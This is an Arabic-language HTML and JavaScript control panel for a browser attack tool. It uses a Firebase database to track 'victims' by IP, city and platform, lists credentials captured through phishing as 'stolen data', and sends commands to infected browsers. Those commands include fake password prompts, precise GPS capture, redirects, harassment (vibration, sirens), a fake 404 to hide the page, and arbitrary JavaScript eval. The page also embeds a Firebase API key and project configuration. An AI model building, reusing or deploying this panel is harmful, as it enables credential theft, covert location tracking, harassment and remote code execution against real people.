<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز التحكم المطور | v3.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap">
    <style>
        :root { --primary: #00ff88; --danger: #ff4b4b; --warning: #ffcc00; --bg: #050505; --surface: #111; --border: #222; }
        body { background: var(--bg); color: #fff; font-family: 'Tajawal', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        .sidebar { width: 350px; background: var(--surface); border-left: 1px solid var(--border); padding: 1.5rem; overflow-y: auto; }
        .main { flex: 1; padding: 2rem; overflow-y: auto; }
        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; }
        h1 { color: var(--primary); font-size: 1.1rem; margin-top: 0; display: flex; align-items: center; justify-content: space-between; }
        select, input, button { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 8px; margin-bottom: 10px; font-family: inherit; }
        .btn-group { display: flex; gap: 10px; }
        .btn-start { background: var(--primary); color: #000; font-weight: bold; cursor: pointer; border: none; }
        .btn-stop { background: var(--danger); color: #fff; font-weight: bold; cursor: pointer; border: none; }
        .session-item { background: #000; padding: 10px; border-radius: 8px; margin-bottom: 10px; border-right: 4px solid var(--primary); font-size: 0.8rem; }
        .captured-item { background: #1a0000; border: 1px solid var(--danger); padding: 10px; border-radius: 8px; margin-bottom: 10px; color: #ff9999; font-size: 0.85rem; }
        .log-item { color: #888; font-size: 0.75rem; border-bottom: 1px solid #222; padding: 5px 0; }
        .badge { background: var(--primary); color: #000; padding: 2px 8px; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h1><span> المتصلون</span> <span class="badge" id="active-count">0</span></h1>
        <div id="sessions-list"></div>
        
        <hr style="border: 0; border-top: 1px solid #222; margin: 1.5rem 0;">
        
        <h1 style="color: var(--danger);">🔑 البيانات المسروقة</h1>
        <div id="captured-list">
            <p style="color: #444; font-size: 0.8rem;">لا توجد بيانات مسروقة بعد...</p>
        </div>
    </div>

    <div class="main">
        <div class="card">
            <h1>🎮 الأوامر المتقدمة</h1>
            <label>اختر العملية</label>
            <select id="action-type">
                <option value="vibrate_loop">هزاز مستمر (تنبيه مادي)</option>
                <option value="siren">تشغيل إنذار عالي (صوت)</option>
                <option value="phish">نافذة تصيد (طلب كلمة مرور)</option>
                <option value="fake_404">تمويه: خطأ 404 (إخفاء الصفحة)</option>
                <option value="location_precise">طلب الموقع الجغرافي الدقيق (GPS)</option>
                <option value="alert">رسالة منبثقة (Alert)</option>
                <option value="redirect">تحويل لرابط (Redirect)</option>
                <option value="eval">تنفيذ كود مخصص (JS)</option>
            </select>
            <input type="text" id="action-value" placeholder="القيمة أو الرسالة المطلوبة...">
            <div class="btn-group">
                <button class="btn-start" style="flex: 3;" onclick="sendCommand('start')">تنفيذ الأمر المختار</button>
                <button class="btn-stop" style="flex: 1;" onclick="sendCommand('stop')">إيقاف</button>
            </div>
        </div>

        <div class="card">
            <h1>📜 سجل النشاط</h1>
            <div id="log-content"></div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD8FbVZcwr9553MF3oew6lTwHWWRd4HSug",
            authDomain: "imagesp.firebaseapp.com",
            databaseURL: "https://imagesp-default-rtdb.firebaseio.com",
            projectId: "imagesp",
            storageBucket: "imagesp.firebasestorage.app",
            messagingSenderId: "1065951052976",
            appId: "1:1065951052976:web:6141574d9b6f1f4c4f6775",
            measurementId: "G-T8R27710QM"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // تتبع الضحايا
        database.ref('sessions').on('value', (snapshot) => {
            const list = document.getElementById('sessions-list');
            const sessions = snapshot.val();
            list.innerHTML = "";
            let count = 0;
            if (sessions) {
                for (let id in sessions) {
                    count++;
                    list.innerHTML += `<div class="session-item">📍 ${sessions[id].ip}<br><small>${sessions[id].city} | ${sessions[id].platform}</small></div>`;
                }
            }
            document.getElementById('active-count').innerText = count;
        });

        // تتبع البيانات المسروقة (Phish)
        database.ref('logs').on('value', (snapshot) => {
            const list = document.getElementById('captured-list');
            const logs = snapshot.val();
            list.innerHTML = "";
            if (logs) {
                for (let id in logs) {
                    const item = logs[id];
                    list.innerHTML = `<div class="captured-item">🔓 ${item.msg}<br><small>${new Date(item.time).toLocaleTimeString()}</small></div>` + list.innerHTML;
                }
            }
        });

        function sendCommand(status) {
            const action = document.getElementById('action-type').value;
            const value = document.getElementById('action-value').value;
            database.ref('commands').set({
                id: Date.now(),
                action: action,
                data: value,
                status: status
            });
        }
    </script>
</body>
</html>
